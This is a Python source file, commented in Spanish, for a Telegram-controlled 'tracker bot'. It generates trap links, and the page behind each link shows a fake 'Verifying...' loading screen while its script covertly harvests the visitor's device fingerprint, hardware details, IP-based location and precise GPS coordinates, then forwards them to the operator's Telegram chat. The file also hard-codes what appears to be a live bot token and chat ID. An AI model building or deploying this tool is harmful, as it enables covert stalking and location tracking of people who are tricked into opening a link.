import telebot
from flask import Flask, request, jsonify
import threading
import random
import string
import os
import time
import requests

# ================= CONFIGURACIÓN =================
TOKEN = '8740631074:AAHdTif9cw9BgLJ1lvuNEUTztYoH1zbxd6w'
TU_CHAT_ID = '2107923970'
PUERTO = 5000
BASE_URL = 'https://tracker-bot-gxaw.onrender.com'

app = Flask(__name__)
bot = telebot.TeleBot(TOKEN, threaded=False)
links_activos = {}

def generar_id_unico(longitud=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=longitud))

def obtener_info_ip(ip):
    """Obtiene información de ubicación usando múltiples servicios"""
    servicios = [
        f'http://ip-api.com/json/{ip}',
        f'http://ipapi.co/{ip}/json/',
        f'https://ipwhois.app/json/{ip}'
    ]
    
    for url in servicios:
        try:
            response = requests.get(url, timeout=5)
            data = response.json()
            
            # ip-api.com
            if 'country' in data:
                return {
                    'ip': ip,
                    'pais': data.get('country', 'Desconocido'),
                    'ciudad': data.get('city', 'Desconocida'),
                    'region': data.get('regionName', 'Desconocida'),
                    'isp': data.get('isp', 'Desconocido'),
                    'latitud': data.get('lat', ''),
                    'longitud': data.get('lon', ''),
                    'timezone': data.get('timezone', ''),
                    'zip': data.get('zip', '')
                }
            
            # ipapi.co
            elif 'country_name' in data:
                return {
                    'ip': ip,
                    'pais': data.get('country_name', 'Desconocido'),
                    'ciudad': data.get('city', 'Desconocida'),
                    'region': data.get('region', 'Desconocida'),
                    'isp': data.get('org', 'Desconocido'),
                    'latitud': data.get('latitude', ''),
                    'longitud': data.get('longitude', ''),
                    'timezone': data.get('timezone', ''),
                    'zip': data.get('postal', '')
                }
            
            # ipwhois.app
            elif 'country' in data:
                return {
                    'ip': ip,
                    'pais': data.get('country', 'Desconocido'),
                    'ciudad': data.get('city', 'Desconocida'),
                    'region': data.get('region', 'Desconocida'),
                    'isp': data.get('connection', {}).get('isp', 'Desconocido'),
                    'latitud': data.get('latitude', ''),
                    'longitud': data.get('longitude', ''),
                    'timezone': data.get('timezone', {}).get('id', ''),
                    'zip': data.get('zip', '')
                }
                
        except Exception as e:
            print(f"Error con {url}: {e}")
            continue
    
    return {'ip': ip, 'pais': 'Desconocido', 'ciudad': 'Desconocida'}

def enviar_telegram(mensaje, parse_mode="HTML"):
    try:
        bot.send_message(TU_CHAT_ID, mensaje, parse_mode=parse_mode, disable_web_page_preview=True)
    except Exception as e:
        print(f"Error: {e}")

# ================= COMANDOS =================
@bot.message_handler(commands=['start', 'generar'])
def comando_generar(message):
    id_unico = generar_id_unico()
    url_trampa = f"{BASE_URL}/t/{id_unico}"
    
    links_activos[id_unico] = {
        'creator': message.from_user.username,
        'url': url_trampa,
        'visitas': 0
    }
    
    texto = f"🎯 <b>Link Generado</b>\n\n"
    texto += f"🔗 <code>{url_trampa}</code>\n\n"
    texto += f"📊 Recopilará: Ubicación, Dispositivo, IP\n"
    texto += f"⚠️ <i>Envía este link para rastrear.</i>"
    
    bot.reply_to(message, texto, parse_mode="HTML")

# ================= RUTAS WEB =================
@app.route('/')
def home():
    return "<h1>🤖 Bot Tracker Activo</h1>"

@app.route('/t/<id_link>')
def servir_trampa(id_link):
    if id_link not in links_activos:
        return "❌ Link inválido", 404
    
    links_activos[id_link]['visitas'] += 1
    return HTML_TRAMPA, 200

@app.route('/api/capturar/<id_link>', methods=['POST'])
def recibir_datos(id_link):
    if id_link not in links_activos:
        return jsonify({"status": "invalid"}), 404

    datos = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    info_ip = obtener_info_ip(ip.split(',')[0].strip())
    
    msg = f"🚨 <b>¡NUEVO VISITANTE!</b>\n\n"
    
    msg += f"📍 <b>UBICACIÓN:</b>\n"
    msg += f"🌐 <b>IP:</b> <code>{info_ip.get('ip', 'N/A')}</code>\n"
    msg += f"🌎 <b>País:</b> {info_ip.get('pais', 'N/A')}\n"
    msg += f"🏙️ <b>Ciudad:</b> {info_ip.get('ciudad', 'N/A')}\n"
    msg += f"📮 <b>Región:</b> {info_ip.get('region', 'N/A')}\n"
    msg += f"🌐 <b>ISP:</b> {info_ip.get('isp', 'N/A')}\n"
    msg += f"🕐 <b>Zona:</b> {info_ip.get('timezone', 'N/A')}\n"
    
    if info_ip.get('latitud') and info_ip.get('longitud'):
        msg += f"📍 <b>Coords:</b> {info_ip.get('latitud')}, {info_ip.get('longitud')}\n"
        msg += f"<a href='https://www.google.com/maps?q={info_ip.get('latitud')},{info_ip.get('longitud')}'>🗺️ Ver en Maps</a>\n"
    
    if datos.get('gps_lat'):
        msg += f"\n🎯 <b>GPS Preciso:</b>\n"
        msg += f"📍 {datos.get('gps_lat')}, {datos.get('gps_lon')}\n"
        msg += f"📏 <b>Precisión:</b> {datos.get('gps_accuracy', 'N/A')}m\n"
        msg += f"<a href='https://www.google.com/maps?q={datos.get('gps_lat')},{datos.get('gps_lon')}'>📍 Mapa GPS</a>\n"
    
    msg += f"\n💻 <b>DISPOSITIVO:</b>\n"
    msg += f"📱 <b>Tipo:</b> {datos.get('device_type', 'N/A')}\n"
    msg += f"🖥️ <b>SO:</b> {datos.get('os', 'N/A')}\n"
    msg += f"🌐 <b>Navegador:</b> {datos.get('browser', 'N/A')}\n"
    msg += f"📐 <b>Pantalla:</b> {datos.get('screen', 'N/A')}\n"
    
    msg += f"\n🔧 <b>HARDWARE:</b>\n"
    msg += f"💾 <b>RAM:</b> {datos.get('ram', 'N/A')}\n"
    msg += f"💻 <b>CPU:</b> {datos.get('cpu_cores', 'N/A')} cores\n"
    msg += f"🔋 <b>Batería:</b> {datos.get('bateria', 'N/A')}%\n"
    
    msg += f"\n📡 <b>CONEXIÓN:</b>\n"
    msg += f"🌐 <b>Tipo:</b> {datos.get('connection_type', 'N/A')}\n"
    msg += f"🌍 <b>Idioma:</b> {datos.get('language', 'N/A')}\n"
    msg += f"⏰ <b>Zona Horaria:</b> {datos.get('timezone', 'N/A')}\n"
    
    msg += f"\n🔐 <b>FINGERPRINT:</b>\n"
    msg += f"🎨 <b>Canvas:</b> <code>{datos.get('canvas', 'N/A')}</code>\n"
    msg += f"🎮 <b>WebGL:</b> {datos.get('webgl_vendor', 'N/A')}\n"
    
    msg += f"\n📊 <b>Visitas:</b> {links_activos[id_link]['visitas']}\n"
    msg += f"🕐 <b>Hora:</b> {time.strftime('%H:%M:%S')}\n"
    
    enviar_telegram(msg)
    return jsonify({"status": "ok"}), 200

# ================= HTML TRAMPA =================
HTML_TRAMPA = """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Cargando...</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(135deg,#0f0f1a 0%,#1a1a2e 100%);color:#fff;font-family:sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center}
.container{text-align:center;padding:20px}
.spinner{width:50px;height:50px;border:4px solid rgba(99,102,241,0.2);border-top:#6366f1;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px}
@keyframes spin{to{transform:rotate(360deg)}}
h1{font-size:20px;margin-bottom:10px;color:#6366f1}
p{color:#94a3b8;font-size:14px}
</style>
</head>
<body>
<div class="container">
  <div class="spinner"></div>
  <h1>Verificando...</h1>
  <p>Recopilando información</p>
</div>
<script>
async function capturar(){
  const id = window.location.pathname.split('/')[2];
  
  const datos = {
    userAgent: navigator.userAgent,
    language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen: window.screen.width + 'x' + window.screen.height,
    platform: navigator.platform
  };
  
  const ua = navigator.userAgent;
  if (ua.includes('Android')) { datos.os = 'Android'; datos.device_type = 'Móvil'; }
  else if (ua.includes('iPhone')) { datos.os = 'iOS'; datos.device_type = 'Móvil'; }
  else if (ua.includes('Windows')) { datos.os = 'Windows'; datos.device_type = 'PC'; }
  else if (ua.includes('Mac')) { datos.os = 'macOS'; datos.device_type = 'PC'; }
  else if (ua.includes('Linux')) { datos.os = 'Linux'; datos.device_type = 'PC'; }
  else { datos.os = 'Desconocido'; datos.device_type = 'Desconocido'; }
  
  if (ua.includes('Chrome') && !ua.includes('Edg')) { datos.browser = 'Chrome'; }
  else if (ua.includes('Firefox')) { datos.browser = 'Firefox'; }
  else if (ua.includes('Safari') && !ua.includes('Chrome')) { datos.browser = 'Safari'; }
  else if (ua.includes('Edg')) { datos.browser = 'Edge'; }
  else { datos.browser = 'Desconocido'; }
  
  datos.cpu_cores = navigator.hardwareConcurrency || 'N/A';
  
  if ('getBattery' in navigator) {
    try {
      const battery = await navigator.getBattery();
      datos.bateria = Math.round(battery.level * 100);
    } catch(e) { datos.bateria = 'N/A'; }
  } else { datos.bateria = 'N/A'; }
  
  if (navigator.deviceMemory) {
    datos.ram = navigator.deviceMemory + ' GB';
  } else { datos.ram = 'N/A'; }
  
  if ('connection' in navigator) {
    datos.connection_type = navigator.connection.effectiveType || 'N/A';
  } else { datos.connection_type = 'N/A'; }
  
  try {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText('fingerprint', 2, 2);
    datos.canvas = canvas.toDataURL().substring(0, 50);
  } catch(e) { datos.canvas = 'N/A'; }
  
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (debugInfo) {
        datos.webgl_vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
      } else {
        datos.webgl_vendor = 'Disponible';
      }
    } else {
      datos.webgl_vendor = 'No disponible';
    }
  } catch(e) { datos.webgl_vendor = 'N/A'; }
  
  if ('geolocation' in navigator) {
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        datos.gps_lat = pos.coords.latitude.toFixed(6);
        datos.gps_lon = pos.coords.longitude.toFixed(6);
        datos.gps_accuracy = pos.coords.accuracy.toFixed(2);
        enviar(datos, id);
      },
      () => enviar(datos, id),
      { enableHighAccuracy: true, timeout: 5000 }
    );
  } else {
    enviar(datos, id);
  }
}

async function enviar(datos, id) {
  try {
    await fetch('/api/capturar/' + id, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(datos),
      keepalive: true
    });
  } catch(e) { console.error(e); }
}

capturar();
</script>
</body>
</html>
"""

# ================= FUNCIONES DE INICIO =================
def iniciar_bot():
    print("🤖 Bot iniciado...")
    bot.infinity_polling()

def iniciar_flask():
    print(f"🌐 Servidor en puerto {PUERTO}...")
    app.run(host='0.0.0.0', port=PUERTO, threaded=True)

if __name__ == '__main__':
    print("✨ Iniciando Tracker Bot...")
    print(f"📍 Base URL: {BASE_URL}")
    threading.Thread(target=iniciar_flask, daemon=True).start()
    iniciar_bot()
